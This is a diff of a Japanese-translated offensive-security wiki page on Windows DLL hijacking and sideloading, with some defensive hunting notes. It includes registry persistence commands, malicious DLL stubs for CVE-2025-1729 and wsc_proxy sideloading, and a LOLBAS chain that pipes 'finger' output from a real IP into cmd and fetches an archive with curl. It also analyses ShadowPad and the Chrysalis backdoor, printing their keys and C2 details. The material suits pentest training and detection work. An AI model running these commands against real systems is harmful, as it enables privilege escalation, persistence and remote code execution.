+- 素朴な hijack は UI を喋らせたりハイライトしたりする。静かにするには、attach 時に Narrator のスレッドを列挙し、main thread を `OpenThread(THREAD_SUSPEND_RESUME)` で開いて `SuspendThread` する; その後は自分の thread で続行する。完全なコードは PoC を参照。
 
 Trigger and persistence via Accessibility configuration
 - User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
 - Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
-- 上記を設定すると、Narrator を起動したときに planted DLL が読み込まれます。secure desktop（logon screen）では、CTRL+WIN+ENTER を押して Narrator を起動します。すると、あなたの DLL が secure desktop 上で SYSTEM として実行されます。
+- 上記の設定により、Narrator を起動すると植え込んだ DLL が読み込まれる。secure desktop (logon screen) では CTRL+WIN+ENTER を押して Narrator を起動し、DLL は secure desktop 上で SYSTEM として実行される。
 
 RDP-triggered SYSTEM execution (lateral movement)
-- classic RDP security layer を許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
-- RDP で host に接続し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動します。すると、あなたの DLL が secure desktop 上で SYSTEM として実行されます。
-- RDP session が閉じると実行は停止します。すぐに inject/migrate してください。
+- classic RDP security layer を許可する: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
+- ホストへ RDP 接続し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動する; DLL は secure desktop 上で SYSTEM として実行される。
+- RDP セッションが閉じると実行は停止する—速やかに inject/migrate する。
 
 Bring Your Own Accessibility (BYOA)
-- built-in Accessibility Tool (AT) の registry entry（例: CursorIndicator）を clone し、任意の binary/DLL を指すように編集して import し、その後 `configuration` をその AT 名に設定できます。これにより、Accessibility framework の下で任意の execution を proxy できます。
+- built-in Accessibility Tool (AT) の registry entry (例: CursorIndicator) を clone し、それを任意の binary/DLL を指すように編集して import し、その後 `configuration` をその AT 名に設定できる。これにより Accessibility framework 経由で任意の実行を proxy できる。
 
 Notes
-- `%windir%\System32` への書き込みと HKLM 値の変更には admin 権限が必要です。
-- すべての payload logic は `DLL_PROCESS_ATTACH` に置けます。exports は不要です。
+- `%windir%\System32` への書き込みと HKLM 値の変更には admin 権限が必要。
+- すべての payload logic は `DLL_PROCESS_ATTACH` に置ける; exports は不要。
 
 ## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe
 
-This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.
+この case は Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を示しており、**CVE-2025-1729** として追跡されている。
 
 ### Vulnerability Details
 
-- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
-- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
-- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
-- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.
+- **Component**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` に存在する。
+- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、logon している user の context で毎日 9:30 AM に実行される。
+- **Directory Permissions**: `CREATOR OWNER` によって書き込み可能で、local users が任意の file を置ける。
+- **DLL Search Behavior**: まず working directory から `hostfxr.dll` の load を試み、欠落している場合は "NAME NOT FOUND" を記録する。これは local directory search の優先順位を示している。
 
 ### Exploit Implementation
 
-An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
+attacker は、欠落している DLL を悪用して同じ directory に悪意ある `hostfxr.dll` stub を置き、user の context で code execution を達成できる:
 ```c
 #include <windows.h>
 
@@ -470,28 +517,28 @@ return TRUE;
 ```
 ### Attack Flow
 
-1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
-2. スケジュールされたタスクが、現在のユーザーのコンテキストで 9:30 AM に実行されるのを待つ。
-3. タスク実行時に管理者がログインしている場合、悪意のある DLL は中程度の整合性で管理者のセッション内で実行される。
-4. 標準的な UAC bypass 技術を連鎖させて、中程度の整合性から SYSTEM 権限へ昇格する。
+1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に置く。
+2. スケジュールされたタスクが 9:30 AM に現在のユーザーのコンテキストで実行されるのを待つ。
+3. タスク実行時に administrator がログインしていれば、悪意のある DLL は administrator のセッション内で medium integrity で実行される。
+4. standard UAC bypass techniques を連鎖させて、medium integrity から SYSTEM 権限へ昇格する。
 
 ## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)
 
-Threat actors は、信頼された署名済みプロセスの下で payload を実行するために、MSI ベースの dropper と DLL side-loading を頻繁に組み合わせる。
+Threat actors は、MSI ベースの dropper と DLL side-loading を組み合わせて、信頼された署名済みプロセスの下で payload を実行することがよくある。
 
 Chain overview
-- ユーザーが MSI をダウンロードする。CustomAction が GUI インストール中にサイレントで実行され（例: LaunchApplication または VBScript action）、埋め込まれた resources から次の stage を再構築する。
-- dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
-- 署名済み EXE が起動すると、Windows DLL search order により working directory から wsc.dll が最初に読み込まれ、署名済み parent の下で attacker code が実行される（ATT&CK T1574.001）。
+- User が MSI をダウンロードする。GUI インストール中に CustomAction が静かに実行され（例: LaunchApplication や VBScript action）、埋め込まれた resources から次の stage を再構築する。
+- dropper は正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
+- 署名済み EXE が起動されると、Windows DLL search order により working directory から先に wsc.dll が読み込まれ、署名済み parent の下で attacker code が実行される（ATT&CK T1574.001）。
 
 MSI analysis (what to look for)
 - CustomAction table:
-- 実行ファイルまたは VBScript を実行するエントリを探す。例: 背景で埋め込まれた file を実行する LaunchApplication の suspicious pattern。
+- 実行ファイルや VBScript を実行するエントリを探す。疑わしいパターンの例: バックグラウンドで埋め込みファイルを実行する LaunchApplication。
 - Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary tables を確認する。
-- MSI CAB 内の埋め込み/split payload:
+- MSI CAB 内の embedded/split payloads:
 - Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
 - または lessmsi を使う: `lessmsi x package.msi C:\out`
-- VBScript CustomAction によって連結・復号される複数の小さな fragments を探す。一般的な flow:
+- 複数の小さな fragments があり、VBScript CustomAction によって連結・復号されるものを探す。一般的な flow:
 ```vb
 ' VBScript CustomAction (high level)
 ' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
@@ -499,10 +546,10 @@ MSI analysis (what to look for)
 ' 3) Decrypt using a hardcoded password/key
 ' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
 ```
-wsc_proxy.exe を使った実践的な sideloading
-- 次の2つのファイルを同じフォルダに置く:
-- wsc_proxy.exe: 正規の署名付きホスト（Avast）。このプロセスは、自身のディレクトリから名前で wsc.dll を読み込もうとする。
-- wsc.dll: 攻撃者の DLL。特定の exports が不要なら、DllMain だけで十分な場合がある。そうでなければ、proxy DLL を作成し、必要な exports を本物のライブラリへ forward しつつ、DllMain で payload を実行する。
+Practical sideloading with wsc_proxy.exe
+- 次の2つのファイルを同じフォルダに配置する:
+- wsc_proxy.exe: 正規の署名済みホスト (Avast)。このプロセスは、自身のディレクトリから名前で wsc.dll を読み込もうとする。
+- wsc.dll: attacker DLL。特定の export が不要なら DllMain だけで十分。必要なら、proxy DLL を作成し、必要な export を正規ライブラリへ forward しつつ、DllMain で payload を実行する。
 - 最小限の DLL payload をビルドする:
 ```c
 // x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
@@ -514,105 +561,105 @@ WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
 return TRUE;
 }
 ```
-- export requirements については、proxying framework（例: DLLirant/Spartacus）を使って、payload も実行する forwarding DLL を生成する。
+- エクスポート要件がある場合は、proxying framework（例: DLLirant/Spartacus）を使って、payload も実行する forwarding DLL を生成する。
 
-- この technique は host binary による DLL name resolution に依存する。host が absolute paths や safe loading flags（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使う場合、hijack は失敗する可能性がある。
+- この technique は host binary による DLL name resolution に依存する。host が absolute paths や safe loading flags（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使うと、hijack は失敗する可能性がある。
 - KnownDLLs、SxS、forwarded exports は precedence に影響し、host binary と export set の選定時に考慮する必要がある。
 
 ## Signed triads + encrypted payloads (ShadowPad case study)
 
-Check Point は、Ink Dragon が ShadowPad を展開する際に、正規 software に紛れ込ませつつ core payload を disk 上で encrypted のまま保つために、**three-file triad** を使っていたと説明した。
+Check Point は、Ink Dragon が ShadowPad を配備するために、正規ソフトウェアになじませつつ core payload を disk 上で encrypted のまま保つ **three-file triad** を使っていると説明した。
 
-1. **Signed host EXE** – AMD、Realtek、NVIDIA などの vendor が悪用される（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は executable を Windows binary に見えるようにリネームする（例: `conhost.exe`）が、Authenticode signature は有効なまま残る。
-2. **Malicious loader DLL** – EXE の隣に期待される名前で配置される（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。DLL は通常、ScatterBrain framework で obfuscation された MFC binary で、役割は encrypted blob を見つけ、decrypt し、ShadowPad を reflectively map することだけ。
-3. **Encrypted payload blob** – 多くの場合、同じ directory に `<name>.tmp` として保存される。decrypted payload を memory-mapping した後、loader は TMP file を削除して forensic evidence を破壊する。
+1. **Signed host EXE** – AMD、Realtek、NVIDIA などの vendor が悪用される（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は executable を Windows binary らしく見える名前（例: `conhost.exe`）に rename するが、Authenticode signature は有効なまま残る。
+2. **Malicious loader DLL** – EXE の横に期待される名前で配置される（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。DLL は通常 ScatterBrain framework で obfuscate された MFC binary で、役割は encrypted blob を見つけ、decrypt し、ShadowPad を reflectively map することだけ。
+3. **Encrypted payload blob** – 多くの場合、同じ directory 内の `<name>.tmp` に保存される。decrypted payload を memory-mapping した後、loader は TMP file を削除して forensic evidence を破壊する。
 
 Tradecraft notes:
 
-* Signed EXE をリネームしつつ（PE header の元の `OriginalFileName` は維持する）ことで、Windows binary であるかのように見せながら vendor signature を保持できる。そのため、Ink Dragon が行っていたように、実際には AMD/NVIDIA utilities である `conhost.exe` 風の binary を配置する手法を再現する。
-* executable が trusted のままであるため、ほとんどの allowlisting controls は malicious DLL を横に置くだけで済む。loader DLL のカスタマイズに集中し、signed parent は通常そのまま実行できる。
-* ShadowPad の decryptor は、mapping 後に file を zero 化できるよう、TMP blob が loader の隣にあり、かつ writable であることを期待する。payload が memory に載るまでは directory を writable に保ち、その後は OPSEC のために TMP file を安全に削除できる。
+* Signed EXE を rename しつつ（PE header 内の元の `OriginalFileName` は保持したまま）Windows binary に masquerade させることで vendor signature を維持できる。したがって、実際には AMD/NVIDIA utility なのに `conhost.exe` のように見える binary を drop する Ink Dragon の手口を再現する。
+* executable は trusted のままなので、ほとんどの allowlisting control は悪意ある DLL をその横に置くだけでよい。loader DLL のカスタマイズに集中し、signed parent は通常そのまま実行できる。
+* ShadowPad の decryptor は、TMP blob が loader の隣にあり、mapping 後にファイルを zero にできるよう writable であることを期待する。payload が load されるまで directory を writable のままにし、memory 上に載った後は OPSEC のために TMP file を安全に削除できる。
 
 ### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)
 
-Operator は DLL sideloading と LOLBAS を組み合わせ、disk 上の custom artifact を trusted EXE の隣にある malicious DLL のみにする:
+Operators は DLL sideloading と LOLBAS を組み合わせ、disk 上の custom artifact を trusted EXE の横にある malicious DLL だけにする。
 
-- **Remote command loader (Finger):** Hidden PowerShell が `cmd.exe /c` を起動し、Finger server から command を取得して `cmd` に渡す:
+- **Remote command loader (Finger):** Hidden PowerShell が `cmd.exe /c` を起動し、Finger server から command を取得して `cmd` に pipe する:
 
 ```powershell
 powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
 ```
-- `finger user@host` は TCP/79 の text を取得し、`| cmd` が server response を実行するため、operator は second stage server-side を切り替えられる。
+- `finger user@host` は TCP/79 の text を取得する。`| cmd` は server response を実行し、operators が second stage server-side を切り替えられるようにする。
 
-- **Built-in download/extract:** benign extension の archive を download し、展開して、sideload target と DLL を random な `%LocalAppData%` folder に配置する:
+- **Built-in download/extract:** benign な extension の archive を download し、unpack して、random な `%LocalAppData%` folder 配下に sideload target と DLL を stage する:
 
 ```powershell
 $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
 ```
-- `curl -s -L` は進捗表示を隠し、redirect を追従する; `tar -xf` は Windows の built-in tar を使う。
+- `curl -s -L` は進捗を隠し、redirect を追跡する。`tar -xf` は Windows の built-in tar を使う。
 
-- **WMI/CIM launch:** WMI 経由で EXE を起動し、telemetry 上では CIM-created process として見せつつ、同じ場所にある DLL を load させる:
+- **WMI/CIM launch:** WMI 経由で EXE を start し、telemetry 上では CIM-created process として見えつつ、同じ場所に置かれた DLL を load する:
 
 ```powershell
 Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
 ```
-- local DLL を優先する binary（例: `intelbq.exe`、`nearby_share.exe`）で動作する; payload（例: Remcos）は trusted name の下で実行される。
+- local DLL を優先する binary（例: `intelbq.exe`、`nearby_share.exe`）で動作する。payload（例: Remcos）は trusted name の下で実行される。
 
-- **Hunting:** `/p`、`/m`、`/c` が同時に現れる `forfiles` に alert を出す; admin script 以外では珍しい。
+- **Hunting:** `/p`、`/m`、`/c` が同時に現れる `forfiles` に alert を出す。admin script 以外では珍しい。
 
 ## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)
 
-最近の Lotus Blossom の intrusion では、trusted な update chain を悪用して NSIS-packed dropper を配布し、DLL sideload と fully in-memory payload を展開した。
+最近の Lotus Blossom の intrusion は、trusted な update chain を悪用して NSIS-packed dropper を配備し、DLL sideload と fully in-memory payload を stage した。
 
 Tradecraft flow
-- `update.exe` (NSIS) が `%AppData%\Bluetooth` を作成し、**HIDDEN** 属性を付け、リネームされた Bitdefender Submission Wizard の `BluetoothService.exe`、malicious な `log.dll`、encrypted blob `BluetoothService` を配置し、その後 EXE を起動する。
+- `update.exe`（NSIS）は `%AppData%\Bluetooth` を作成し、**HIDDEN** を設定して、rename された Bitdefender Submission Wizard の `BluetoothService.exe`、malicious な `log.dll`、encrypted blob `BluetoothService` を drop し、その後 EXE を起動する。
 - host EXE は `log.dll` を import し、`LogInit`/`LogWrite` を呼ぶ。`LogInit` は blob を mmap-load し、`LogWrite` は custom な LCG-based stream（定数 **0x19660D** / **0x3C6EF35F**、key material は prior hash から導出）で decrypt し、buffer を plaintext shellcode で上書きし、temporary を解放してそこへ jump する。
-- IAT を避けるため、loader は **FNV-1a basis 0x811C9DC5 + prime 0x1000193** で export name を hash し、その後 Murmur-style avalanche（**0x85EBCA6B**）を適用して salted target hash と比較することで API を resolve する。
+- IAT を避けるため、loader は export name を **FNV-1a basis 0x811C9DC5 + prime 0x1000193** で hash し、Murmur-style の avalanche（**0x85EBCA6B**）を適用したうえで salted target hash と比較して API を resolve する。
 
 Main shellcode (Chrysalis)
-- key `gQ2JR&9;` を使って add/XOR/sub を 5 pass 繰り返し、PE-like main module を decrypt し、その後 `Kernel32.dll` → `GetProcAddress` を dynamic に load して import resolution を完了する。
-- per-character の bit-rotate/XOR transform を使って runtime で DLL name string を再構築し、その後 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を load する。
-- 2つ目の resolver は **PEB → InMemoryOrderModuleList** を走査し、各 export table を 4-byte block で Murmur-style mixing 付きで parse し、hash が見つからない場合のみ `GetProcAddress` に fallback する。
+- key `gQ2JR&9;` を使って add/XOR/sub を five passes 繰り返し、PE-like main module を decrypt し、その後 `Kernel32.dll` → `GetProcAddress` を dynamic load して import resolution を完了する。
+- per-character の bit-rotate/XOR transform により runtime で DLL name string を再構築し、その後 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を load する。
+- 2つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各 export table を 4-byte block ごとに Murmur-style mixing で parse し、hash が見つからない場合のみ `GetProcAddress` に fallback する。
 
 Embedded configuration & C2
-- config は配置された `BluetoothService` file の **offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7` で RC4-decrypt され、C2 URL と User-Agent が明らかになる。
-- beacon は dot-delimited の host profile を生成し、tag `4Q` を先頭に付け、key `vAuig34%^325hGV` で RC4-encrypt してから HTTPS 越しに `HttpSendRequestA` を行う。response は RC4-decrypt され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）で処理される。
-- 実行 mode は CLI args で分岐する: 引数なし = `-i` を指す persistence（service/Run key）を install; `-i` は自分自身を `-k` 付きで再起動; `-k` は install を省いて payload を実行。
+- config は落とされた `BluetoothService` file の **offset 0x30808**（size **0x980**）内にあり、key `qwhvb^435h&*7` で RC4-decrypt され、C2 URL と User-Agent が明らかになる。
+- beacon は dot-delimited な host profile を組み立て、tag `4Q` を前置し、`vAuig34%^325hGV` を key に RC4-encrypt してから HTTPS 経由で `HttpSendRequestA` する。response は RC4-decrypt され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）で dispatch される。
+- execution mode は CLI args で制御される。args なし = `-i` を指す persistence（service/Run key）を install; `-i` は自分自身を `-k` 付きで再起動; `-k` は install を飛ばして payload を実行する。
 
 Alternate loader observed
-- 同じ intrusion では Tiny C Compiler も配置され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を `libtcc.dll` を隣に置いて実行した。攻撃者提供の C source は shellcode を埋め込み、compile され、PE を disk に残さず in-memory で実行された。再現するには:
+- 同じ intrusion では Tiny C Compiler も drop され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` が `libtcc.dll` を横に置いた状態で実行された。攻撃者が提供した C source は shellcode を埋め込み、compile され、PE を disk に書き込まずに in-memory で実行された。再現方法:
 ```cmd
 C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
 ```
-- この TCC ベースの compile-and-run ステージは `Wininet.dll` を runtime で import し、hardcoded URL から second-stage shellcode を取得して、compiler 実行を装う柔軟な loader を提供した。
+- この TCC-based compile-and-run stage は `Wininet.dll` を runtime で import し、hardcoded URL から second-stage shellcode を取得して、compiler run を装う柔軟な loader を実現していた。
 
 ## Signed-host sideloading with export proxying + host thread parking
 
 Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.
 
 Observed pattern
-- 期待される dependency 名として `version.dll` などを使い、trusted EXE を malicious DLL の横に drop する。
-- malicious DLL は、すべての期待される export を real system DLL（たとえば `%SystemRoot%\\System32\\version.dll`）へ **proxy** し、import resolution が成功し続けて host process が動作を維持できるようにする。
-- load 後、malicious DLL は host entry point を **patch** して、main thread が終了したり process を terminate する code paths を実行したりせず、無限の `Sleep` loop に入るようにする。
-- 新しい thread が本来の malicious work を実行する。次の stage の DLL 名や path を decrypt し（RC4/XOR が一般的）、`LoadLibrary` で起動する。
+- trusted EXE を malicious DLL の横に、`version.dll` のような期待される dependency name を使って配置する。
+- malicious DLL は、期待されるすべての export を real system DLL（たとえば `%SystemRoot%\\System32\\version.dll`）へ **proxy** し、import resolution が成功し続けて host process も動作を維持できるようにする。
+- load 後、malicious DLL は host entry point を **patch** し、main thread が終了したり、process を終わらせる code paths を実行したりせず、無限の `Sleep` loop に入るようにする。
+- 新しい thread が実際の malicious work を行う。次 stage の DLL 名または path を decrypt し（RC4/XOR が一般的）、`LoadLibrary` で起動する。
 
 Why this matters
-- 通常の DLL proxying は API compatibility を維持するが、later stages のために host が十分長く生存することまでは保証しない。
-- main thread を `Sleep(INFINITE)` に置くのは、loader が worker thread 内で decryption、staging、network bootstrap を行っている間、signed process を resident に保つ単純な方法。
-- `DllMain` だけを suspicious として追うと、host entry point が patch されて secondary thread が開始された後に interesting behavior が起きる場合、この pattern を見逃す。
+- Normal DLL proxying は API compatibility を保つが、host が later stages のために十分長く生き続けることは保証しない。
+- main thread を `Sleep(INFINITE)` に待機させるのは、loader が worker thread で decryption、staging、network bootstrap を実行している間、signed process を resident に保つ簡単な方法。
+- suspicious な `DllMain` だけを hunting すると、この pattern を見逃す可能性がある。面白い挙動が host entry point の patch 後に発生し、secondary thread が開始されるため。
 
 Minimal workflow
-1. signed host EXE をコピーし、local directory からどの DLL を解決するかを判定する。
-2. 同じ functions を export し、legitimate DLL に forwarding する proxy DLL を build する。
-3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を create する。
-4. その thread から host entry point または main thread start routine を patch して、`Sleep` で loop するようにする。
-5. 次の stage の DLL 名/config を decrypt し、`LoadLibrary` を call するか、payload を manual-map する。
+1. signed host EXE をコピーし、local directory から解決される DLL を特定する。
+2. 同じ functions を export し、それらを legitimate DLL に forward する proxy DLL を build する。
+3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
+4. その thread から、host entry point または main thread start routine を patch し、`Sleep` 上で loop するようにする。
+5. 次 stage の DLL 名/config を decrypt し、`LoadLibrary` を呼ぶか payload を manual-map する。
 
 Defensive pivots
-- `System32` ではなく、自身の application directory から `version.dll` や同様の common libraries を load する signed processes。
-- image load の直後に process entry point へ加えられる memory patch、特に `Sleep`/`SleepEx` へ redirected された jumps/calls。
-- proxy DLL によって create された threads が、decrypted 名を持つ second DLL に対して直ちに `LoadLibrary` を call する挙動。
-- `ProgramData`、`%TEMP%`、または unpacked archive paths のような writable staging directories 内で、vendor executables の横に置かれた full-export proxy DLL。
+- `System32` ではなく、application directory から `version.dll` または同様に一般的な library を load する signed processes。
+- image load の直後に process entry point へ行われる memory patch、特に `Sleep`/`SleepEx` へ redirect された jumps/calls。
+- proxy DLL によって作成された thread が、decrypt された名前の second DLL に対して即座に `LoadLibrary` を呼ぶ。
+- `ProgramData`、`%TEMP%`、または unpacked archive paths のような writable staging directories 内で vendor executables の横に置かれた full-export proxy DLL。
 
 ## References
 
@@ -630,9 +677,14 @@ Defensive pivots
 - [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 - [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
 - [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
-- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
-- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
+- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
 - [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
+- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
+- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
+- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
+- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
+- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
+- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
 - [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
 
 
